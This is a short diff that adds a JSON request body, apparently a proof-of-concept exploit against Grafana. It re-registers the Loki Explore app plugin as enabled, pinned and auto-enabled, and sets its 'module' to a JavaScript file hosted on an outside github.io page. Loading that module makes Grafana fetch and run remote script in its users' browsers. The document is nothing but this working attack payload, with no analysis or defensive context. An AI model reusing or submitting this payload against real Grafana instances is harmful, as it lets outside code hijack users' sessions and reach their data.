@@ -1,0 +1,11 @@
+{
+  "name": "ExploitPluginReq",
+  "type": "app",
+  "id": "grafana-lokiexplore-app",
+  "enabled": true,
+  "pinned": true,
+  "autoEnabled": true,
+  "module": "https://rafid2211.github.io/rafid.ahmed.io/rafid.js",
+  "baseUrl": "public/plugins/grafana-lokiexplore-app",
+  "info": { "author": { "name": "POC" } }
+}
